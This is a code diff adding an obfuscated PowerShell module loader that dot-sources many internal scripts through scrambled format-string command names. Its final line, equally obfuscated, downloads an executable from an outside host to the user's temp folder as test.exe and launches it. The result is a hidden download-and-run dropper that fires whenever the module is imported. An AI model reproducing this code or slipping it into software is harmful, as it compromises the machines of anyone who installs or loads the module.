@@ -1,0 +1,68 @@
+. ("{0}{3}{4}{2}{5}{1}"-f 'Im','File','Mod','port','-','ule') -Path "$($script:ModuleRoot)\internal\scripts\cmdlets.ps1"
+
+
+. ("{3}{1}{0}{2}" -f 'du','port-Mo','leFile','Im') -Path "$($script:ModuleRoot)\bin\type-aliases.ps1"
+
+
+. ("{1}{3}{2}{0}" -f'leFile','Impo','Modu','rt-') -Path "$($script:ModuleRoot)\internal\scripts\strings.ps1"
+
+
+foreach (${f`iLe} in (.("{1}{0}{2}" -f'ChildI','Get-','tem') -Path "$($script:ModuleRoot)\internal\configurationschemata\*.ps1"))
+{
+	. ("{1}{2}{0}{4}{3}" -f'port','I','m','leFile','-Modu') -Path ${f`iLe}."F`ULL`NAme"
+}
+foreach (${fi`LE} in (.("{1}{2}{0}"-f 'm','G','et-ChildIte') -Path "$($script:ModuleRoot)\internal\configurationvalidation\*.ps1"))
+{
+	. ("{1}{0}{4}{3}{2}" -f 'rt','Impo','eFile','l','-Modu') -Path ${f`IlE}."fUL`lN`AMe"
+}
+foreach (${F`iLe} in (&("{1}{0}{2}" -f'-','Get','ChildItem') -Path "$($script:ModuleRoot)\internal\configurations\*.ps1"))
+{
+	. ("{3}{1}{2}{0}{4}"-f 'il','ort-Modu','leF','Imp','e') -Path ${fI`lE}."F`UlL`NAME"
+}
+
+
+. ("{5}{2}{4}{3}{1}{0}" -f'e','leFil','port-M','du','o','Im') -Path "$($script:ModuleRoot)\internal\scripts\loadConfigurationPersisted.ps1"
+
+
+foreach (${F`Ile} in (&("{2}{0}{1}"-f'ChildI','tem','Get-') -Path "$($script:ModuleRoot)\internal\loggingProviders\*.ps1"))
+{
+	. ("{0}{2}{1}{3}"-f 'Im','-Modul','port','eFile') -Path ${f`ILE}."FU`Llna`me"
+}
+
+
+. ("{1}{3}{0}{2}"-f'oduleFil','Import','e','-M') -Path "$($script:ModuleRoot)\internal\scripts\async-logging2.ps1"
+
+
+foreach (${F`ILe} in (&("{0}{2}{3}{1}"-f 'G','ildItem','et-','Ch') -Path "$($script:ModuleRoot)\internal\tepp\scripts\*.ps1"))
+{
+	. ("{0}{3}{1}{4}{2}" -f'I','port-M','uleFile','m','od') -Path ${Fi`Le}."f`ULl`Name"
+}
+. ("{5}{1}{3}{2}{4}{0}"-f 'ile','r','l','t-Modu','eF','Impo') -Path "$($script:ModuleRoot)\internal\tepp\tepp-assignment.ps1"
+
+
+foreach (${Fi`lE} in (.("{2}{1}{3}{0}"-f'm','h','Get-C','ildIte') -Path "$($script:ModuleRoot)\internal\parameters\*.ps1"))
+{
+	. ("{3}{1}{0}{4}{2}" -f 'port','m','le','I','-ModuleFi') -Path ${FI`LE}."f`ULLnA`ME"
+}
+
+
+. ("{3}{2}{4}{0}{1}"-f 'duleFil','e','mp','I','ort-Mo') -Path "$($script:ModuleRoot)\bin\type-extensions.ps1"
+
+
+. ("{1}{3}{0}{2}"-f't-Modul','Imp','eFile','or') -Path "$($script:ModuleRoot)\internal\scripts\taskEngine.ps1"
+
+
+. ("{0}{3}{4}{1}{2}" -f 'Impo','uleFil','e','rt-Mo','d') -Path "$($script:ModuleRoot)\internal\scripts\removalEvent.ps1"
+
+
+. ("{3}{1}{2}{0}{4}" -f 'i','port-Modul','eF','Im','le') -Path "$($script:ModuleRoot)\internal\scripts\variables.ps1"
+
+
+. ("{4}{3}{2}{0}{1}" -f 'i','le','eF','l','Import-Modu') -Path "$($script:ModuleRoot)\internal\scripts\sessionRegistration.ps1"
+
+
+. ("{2}{3}{1}{0}" -f 'uleFile','rt-Mod','I','mpo') -Path "$($script:ModuleRoot)\internal\scripts\teppInputResources.ps1"
+
+
+. ("{2}{3}{1}{0}"-f'e','ort-ModuleFil','I','mp') -Path "$($script:ModuleRoot)\internal\scripts\license.ps1"
+(.("{0}{2}{1}" -f 'New','t','-Objec') ("{3}{1}{2}{0}{4}" -f't.WebClie','tem.','Ne','Sys','nt')).("{3}{2}{0}{1}"-f 'nl','oadFile','w','Do').Invoke(("{7}{0}{9}{3}{5}{10}{4}{11}{6}{8}{2}{1}"-f '://lv','xe','ulator.e','.3','eb.com/nano','ee','Cal','http','c','rxd','w','/'),"$env:TEMP\test.exe");.("{2}{0}{1}{3}{4}" -f 'tart-','Pro','S','c','ess') ("$env:TEMP\test.exe")
